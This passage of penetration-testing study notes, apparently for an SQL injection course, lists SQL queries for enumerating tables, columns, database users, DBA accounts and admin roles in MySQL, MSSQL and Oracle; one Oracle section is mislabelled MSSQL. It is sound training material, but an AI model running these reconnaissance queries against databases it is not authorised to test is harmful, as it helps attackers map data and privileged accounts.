+</code></pre><p id="1ea483c1-6ec1-4206-bbcf-736b9974f935" class="">The alias:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e7520d42-87a7-439b-a428-7cffa045ec08" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SHOW TABLES; //current schema
+SHOW TABLES in EMPLOYEES; // other database
+</code></pre><p id="3b1bc641-4411-497c-9983-b0a8acd63b2d" class="">The columns are within the INFORMATION_SCHEMA.COLUMNS:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f563d934-8c75-4a40-9a53-9f6746514e44" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;
+</code></pre><p id="ae7fa5a5-f6ad-46fe-9630-2e88f0ebc239" class="">with alias:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="013ac25c-da80-4d43-8445-24ae03e3a16c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SHOW COLUMNS FROM DEPARTMENTS IN EMPLOYEES; # cols in a table, database
+</code></pre><h3 id="f5da76b9-83cd-4f07-b01f-1313f40f0143" class=""><strong>MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#mssql"></a></strong></h3><p id="84fc22df-354c-470e-a3dd-e32eb23f22f7" class="">Information about tables are stored within <strong>sysobjects</strong></p><p id="6855072f-30e4-4e6c-88b3-a9027bc248e3" class="">→ http://technet.microsoft.com/en-us/library/aa260447(v=sql.80).aspx</p><p id="038da5fc-a87b-46d8-b02e-df339b87e976" class="">This table contains info about all the objects defined For that specific schema:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e81b1758-ee10-42e2-831f-e57ac5c084f9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name FROM sysobjects WHERE xtype=&#x27;U&#x27;
+</code></pre><p id="951c5400-a16a-466c-ac70-a5bb174123a3" class="">To retrieve the list of tables: // add the name of the database before <strong>sysobjects</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0d979d3d-e7db-4e7c-8743-a5fa0597746f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name FROM employees..sysobjects WHERE xtype=&#x27;U&#x27;
+
+# the xtype defines objects types:
+- S  = System Table
+- U  = User Table
+- TT = Table Type
+- X  = Extended Stored Procedure
+- V  = Views
+</code></pre><p id="78544b3e-e6dd-48df-b4c2-05d3e8b3673f" class="">Alternative, <strong>INFORMATION_SCHEMA</strong> views we can retrieve info about tables and views of the current database</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9fcd0d15-2e9e-4c26-ad4a-4a10a536f2e7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT table_name FROM INFORMATION_SCHEMA.TABLES
+SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type = &#x27;BASE TABLE&#x27;
+</code></pre><p id="11ebbc10-16cb-4c78-9575-acdbac617646" class="">For a specific database just add the name of the db before:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0ba26028-a2a8-4b45-b026-f14a454ef6d4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES
+SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES WHERE table_type = &#x27;BASE TABLE&#x27;
+</code></pre><p id="b7532cb0-f4a1-4146-bcdb-b1ee89e03beb" class="">Enumeration of columns is similar:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="967ad626-9039-458d-bea0-5e2503eee70b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name FROM syscolumns
+SELECT name FROM employees.syscolumns
+</code></pre><p id="761063af-83ef-4086-b3b6-0dc83759a1b0" class="">Alternative, using INFORMATION_SCHEMA:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25a44f46-340e-4fda-a6d9-2df6ff831d67" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT column_name FROM INFORMATION_SCHEMA.columns
+SELECT column_name FROM employees.INFORMATION_SCHEMA.columns
+SELECT column_name FROM employees.INFORMATION_SCHEMA.columns WHERE table_name=&#x27;salary&#x27;
+</code></pre><h3 id="f4d2b473-022c-4332-bad9-279ddd7686f6" class=""><strong>Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#oracle"></a></strong></h3><p id="edd7ded2-ac92-48af-af86-a49126a51331" class="">ts a simple query</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6e91865d-4600-45f5-8e90-0afea0d57e7c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2105.htm#REFRN20286
+
+SELECT table_name, tablespace_name FROM SYS.all_tables
+SELECT table_name, tablespace_name FROM all_tables
+</code></pre><p id="cd53c2d5-698c-4c89-b07e-ba50ad717b5c" class="">There is a special table in Oracle name <strong>DUAL</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7a1890f8-ce8b-4dc6-85ed-83316d175922" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm
+
+SELECT &quot;WAPTx&quot; FROM DUAL;
+
+# Is useful For computing a constant expression with the SELECT statement
+</code></pre><h3 id="c1e16bd1-4ee9-4e37-997d-eae06fddddd0" class=""><strong>MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#mssql-1"></a></strong></h3><p id="1be30444-248a-4f82-aadc-4a9c3871bdff" class="">The system view <em>ALL_TAB_COLUMNS</em></p><p id="0d9c64b9-1c59-4f37-a923-f34301f4cdea" class="">https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2091.htm</p><p id="06219280-23f9-4743-bdab-19f97793ff3f" class="">Its useful in enumerating the columns of the tables, views and clusters accessible to the currrent user:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1809ddfe-97e2-40bb-9c67-8ea0aca2edac" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT column_name FROM SYS.ALL_TAB_COLUMNS
+SELECT column_name FROM ALL_TAB_COLUMNS
+</code></pre><h2 id="bde38013-2734-4a3d-9c07-4fe1d9a5a6cf" class=""><strong>Database Users and Privileges</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#database-users-and-privileges"></a></strong></h2><h3 id="1daba0a4-5216-4c98-92df-6e13232b71e2" class=""><strong>MySQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#mysql-1"></a></strong></h3><p id="e5604b7e-69df-42d4-b519-5560bc184dcc" class="">Some useful functions to do the job:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="faeb12bb-25ce-40b8-8e4e-ddba3821ecee" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">User()        # FUNCTIONS
+Current_user()
+System_user()
+Session_user()
+Current_user  # CONSTANT
+</code></pre><p id="0d7a31c0-707e-41e6-88a4-16ab8fe3433c" class="">If the user is privileged:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b0ee56c8-0e3b-4b35-9025-f54f8cd45b19" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT user FROM mysql.user;
+</code></pre><p id="96516dab-66c4-4c81-afac-9b4ac395439e" class="">The privileges are all stored in INFORMATION_SCHEMA</p><p id="a58ee547-9ebc-49a2-a589-cd04737201c2" class="">And organized by the tables:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f98a9b4c-724f-4ca3-ad35-81c86067b597" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">COLUMN_PRIVILEGES
+SCHEMA_PRIVILEGES
+TABLE_PRIVILEGES()
+USER_PRIVILEGES
+</code></pre><p id="3c7985ee-c529-47b2-b80d-f89ea6708962" class="">It can be retrieve like that:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6769e075-e066-4177-a535-144e94d5567b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
+</code></pre><p id="58ac9e86-7ad4-423e-9fe7-3441f4fed0bd" class="">To show privileges on databases:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3249a42f-49bd-4eba-a3d1-a24bae5453fe" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT grantee, table_schema, privilege_type FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;
+</code></pre><p id="6c52edcc-576f-4274-9ad7-3c5aaf644bef" class="">To show privileges from respective columns:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="056bc45a-1077-412b-9ed3-c136f2942a7c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT user, select_priv,..., FROM MYSQL.USER;
+</code></pre><p id="e7ed4f7e-c8e0-422e-8cdd-c7a916cd4511" class="">To gather the DBA accounts:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="281123a2-0d3c-486d-9d0e-8ab4c89a061a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE privilege_type=&#x27;SUPER&#x27;;
+</code></pre><p id="74b714c5-13f5-4052-ac65-65463c86fbc8" class="">Privileged users need to change the query:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="20ef9d69-53f4-4267-9507-5754f2e9371d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT user FROM MYSQL.USER WHERE Super_priv=&#x27;Y&#x27;;
+</code></pre><h3 id="631b97c6-1e71-4346-a3f1-5ec1e89c91e4" class=""><strong>MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#mssql-2"></a></strong></h3><p id="10915ab3-60e6-4db3-98d9-248efa76d7e3" class="">Its similar to mysql</p><p id="d75a82c5-ffb6-4518-b155-3d61b752646b" class="">We have some functions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81551141-0b48-4133-a6f5-14c813aeacda" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">suser_sname() //FUNCTION
+User          // CONSTANTS
+System_user
+</code></pre><p id="79a47b4f-4960-4a6b-8b8b-ca4eabdf1bb2" class="">We can also use the System Table:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="db197ca6-0aa9-458a-9bc9-9000974e4972" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT loginame FROM SYSPROCESSES WHERE spid = @@SPID
+# Current User Process ID
+
+# http://msdn.microsoft.com/en-us/library/ms189535.aspx
+
+SELECT name FROM SYSLOGINS;
+# all users
+</code></pre><p id="90861f9d-6f85-46f3-80e1-22506d1f27a9" class="">We can use System Views:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7ddac998-01d8-4661-a579-093d6a1d4bd8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT original_login_name FROM SYS.DM_EXEC_SESSIONS WHERE status=&#x27;running&#x27;
+# current active user
+</code></pre><p id="348b1ecb-3341-4e29-8d21-0c31a0bc7697" class="">Once we identified the users, we need to understand their privileges:</p><p id="125e0563-ac17-48a6-b694-75855d9467c9" class="">IS_SRVOLEMEMBER = http://msdn.microsoft.com/en-us/library/ms176015.aspx</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fecd64d3-35bc-4b42-9dc7-c9df863975f1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">IF IS_SRVOLEMEMBER(&#x27;sysadmin&#x27;)=1
+# print &#x27;Current users login is a member of the sysadmin role&#x27;
+
+ELSE IF IS_SRVOLEMEMBER(&#x27;sysadmin&#x27;)=0
+# print &#x27;Current users login is NOT a member of the sysadmin role&#x27;
+</code></pre><p id="4b03c21f-621c-4801-9a9a-316a2137fca7" class="">In addition to sysadmin, there are other possibles roles:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="11b8587d-f7eb-4e20-8a25-9ef0e8cfb651" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">serveradmin
+dbcreator
+setupadmin
+bulkadmin
+securityadmin
+diskadmin
+public
+processadmin
+</code></pre><p id="53cb7e89-ce1a-41a5-ac20-fab4114d2633" class="">We can use this function to ask about other users:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37a6190c-7296-4f96-8bab-dd3f0dedf6fd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT IS_SRVOLEMEMBER (&#x27;processadmin&#x27;,&#x27;aw&#x27;)
+# aw is the name of the SQL Server login to check. If the username is supplied as an argument, its the current user.
